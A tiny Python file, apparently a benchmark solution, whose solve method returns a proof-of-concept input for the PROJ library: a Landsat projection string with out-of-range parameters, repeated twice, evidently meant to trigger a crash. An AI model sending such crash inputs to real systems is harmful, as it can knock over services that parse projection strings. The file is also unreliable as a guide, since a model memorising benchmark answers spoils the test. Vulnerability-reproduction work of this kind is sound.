import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_line = b"+proj=lsat +lsat=9 +path=0\n"
        return poc_line + poc_line